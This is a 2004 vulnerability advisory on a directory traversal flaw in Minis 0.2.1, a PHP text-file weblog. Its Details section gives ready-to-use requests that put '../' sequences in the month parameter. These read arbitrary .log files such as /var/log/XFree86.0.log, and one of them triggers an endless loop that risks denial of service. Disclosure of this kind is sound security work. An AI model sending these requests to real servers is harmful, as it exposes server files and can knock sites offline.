Subject: Minis directory traversal vulnerability


-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


Title: Minis directory traversal vulnerability
Vulnerability discovery: Madelman <madelman AT iname.com>
Date: 31/12/2004
Severity: Moderate

Summary:
- --------

(from vendor site: http://minis.sourceforge.net/)

Minis is a tiny, PHP-powered, text-file based weblogging system.
It is easily configured for normal use and it doesnt require any
databases, such as MySQL. Also, with some PHP-knowledge youll be
able to configure Minis endlessly.

Minis doesn't check the month parameter which allows reading any file with .log extension

This vulnerability has been tested with Minis 0.2.1


Details:
- --------

If we want to read /var/log/XFree86.0.log:

REQUEST:
http://[SERVER]/minis/minis.php?month=../../../../../../../../var/log/XFree86.0
RETURNS: (looking at source of HTML)
[...]

If we try to read a file that doesn't exist (in this example /var/log/XFree86.log) Minis returns "No such month"

REQUEST:
http://[SERVER]/minis/minis.php?month=../../../../../../../../var/log/XFree86
RESPONSE:
No such month.


If we try to read a file the webserver doesn't have autorization to, Minis enters an endless loop which
could cause an incredible amount of bandwith spent by the server or even a DoS

REQUEST:
http://[SERVER]/minis/minis.php?month=../../../../../../../../var/log/auth
RETURNS:
Warning: fopen(blog/../../../../../../../../var/log/auth.log): failed to open stream: Permission denied in /var/www/minis/minis.php on line 109

../../../../../../../../var/log/auth
